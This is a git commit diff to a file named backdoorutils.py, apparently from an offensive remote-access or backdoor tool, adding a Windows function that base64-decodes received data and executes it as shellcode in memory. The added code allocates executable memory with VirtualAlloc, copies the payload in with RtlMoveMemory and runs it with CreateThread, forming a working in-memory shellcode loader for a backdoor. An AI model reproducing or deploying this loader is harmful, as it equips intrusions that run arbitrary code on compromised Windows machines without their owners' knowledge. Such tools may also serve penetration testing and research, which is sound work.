f2bbffa5887455ba23be0fe632bb294dbb754bf8
juliocesarfort <julio@blazeinfosec.com>
2016-05-17 14:38:25 +0200

    Added shellcode execution functionality

--- backdoorutils.py
+++ backdoorutils.py
@@ -152,5 +152,29 @@ def execute_shellcode(msg):
     if "Windows" not in platform.system():
         return "[!] Currently this functionality is only available for Windows platforms."
     else:
-        # CODE FOR THIS FUNCTIONALITY GOES HERE
-        return "[*] Shellcode (%d bytes) executed in memory." % len(msg)
+        # based on Debasish Mandal's "Execute ShellCode Using Python"
+        # http://www.debasish.in/2012/04/execute-shellcode-using-python.html
+        shellcode = bytearray(base64.b64decode(msg))
+        
+        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                                  ctypes.c_int(len(shellcode)),
+                                                  ctypes.c_int(0x3000),
+                                                  ctypes.c_int(0x40))
+         
+        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+         
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                             buf,
+                                             ctypes.c_int(len(shellcode)))
+         
+        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                                 ctypes.c_int(0),
+                                                 ctypes.c_int(ptr),
+                                                 ctypes.c_int(0),
+                                                 ctypes.c_int(0),
+                                                 ctypes.pointer(ctypes.c_int(0)))
+         
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
+                                                   ctypes.c_int(-1))        
+
+        return "[*] Shellcode (%d bytes) executed in memory." % len(shellcode)
